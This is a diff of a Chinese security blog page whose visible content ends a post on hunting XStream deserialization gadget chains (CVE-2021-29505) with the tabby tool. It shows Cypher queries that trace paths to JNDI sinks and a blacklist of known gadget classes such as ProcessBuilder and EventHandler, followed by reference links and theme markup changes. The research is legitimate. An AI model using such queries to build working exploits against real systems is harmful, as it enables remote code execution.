-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)<br></code></pre></td></tr></table></figure>
 <p>增加黑名单过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)</span><br><span class="line">&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)</span><br><span class="line">match (source)-[:CALL]-&gt;(m1:Method)</span><br><span class="line">match (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)</span><br><span class="line">call apoc.algo.allSimplePaths(sink, m1, &quot;&lt;CALL|ALIAS&quot;, 8) yield path</span><br><span class="line">where none(n in nodes(path) where n.CLASSNAME in [&quot;java.beans.EventHandler&quot;, &quot;java.lang.ProcessBuilder&quot;, &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot;, &quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;, &quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;, &quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;, &quot;sun.swing.SwingLazyValue&quot;, &quot;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&quot;, &quot;com.sun.jndi.rmi.registry.BindingEnumeration&quot;, &quot;sun.rmi.registry.RegistryImpl_Stub&quot;, &quot;com.sun.jndi.cosnaming.CNBindingEnumeration&quot;, &quot;com.sun.jndi.toolkit.dir.HierMemDirCtx$FlatBindings&quot;, &quot;com.sun.jndi.ldap.LdapReferralException&quot;])</span><br><span class="line">return source, path limit 50</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)<br>&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)<br>match (source)-[:CALL]-&gt;(m1:Method)<br>match (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)<br>call apoc.algo.allSimplePaths(sink, m1, &quot;&lt;CALL|ALIAS&quot;, 8) yield path<br>where none(n in nodes(path) where n.CLASSNAME in [&quot;java.beans.EventHandler&quot;, &quot;java.lang.ProcessBuilder&quot;, &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot;, &quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;, &quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;, &quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;, &quot;sun.swing.SwingLazyValue&quot;, &quot;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&quot;, &quot;com.sun.jndi.rmi.registry.BindingEnumeration&quot;, &quot;sun.rmi.registry.RegistryImpl_Stub&quot;, &quot;com.sun.jndi.cosnaming.CNBindingEnumeration&quot;, &quot;com.sun.jndi.toolkit.dir.HierMemDirCtx$FlatBindings&quot;, &quot;com.sun.jndi.ldap.LdapReferralException&quot;])<br>return source, path limit 50<br></code></pre></td></tr></table></figure>
 <h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ol>
 <li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/278188.html">https://www.freebuf.com/vuls/278188.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains_2/">https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains_2/</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains/">https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains/</a></li>
 <li><a target="_blank" rel="noopener" href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html</a></li>
 </ol>
-
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EXStream-1-4-16-CVE-2021-29505%E7%9A%84%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.</span> <span class="toc-text">基于XStream-1.4.16 CVE-2021-29505的探索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XStream-1-4-17%E9%99%90%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">XStream 1.4.17限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&text=XStream与tabby"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&is_video=false&description=XStream与tabby"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=XStream与tabby&body=Check out this article: https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&name=XStream与tabby&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&t=XStream与tabby"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2016-2023
-    RacerZ
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
- 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Umami Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-</body>
-</html>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/11/11/21%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B%E5%A4%8D%E7%8E%B0/">← Next 21年美亚杯电子数据取证团队赛复现</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/11/06/2022%E9%95%BF%E5%AE%89%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%8D%E7%9B%98/">22年长安杯电子数据取证复盘 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EXStream-1-4-16-CVE-2021-29505%E7%9A%84%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.</span> <span class="toc-text">基于XStream-1.4.16 CVE-2021-29505的探索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XStream-1-4-17%E9%99%90%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">XStream 1.4.17限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
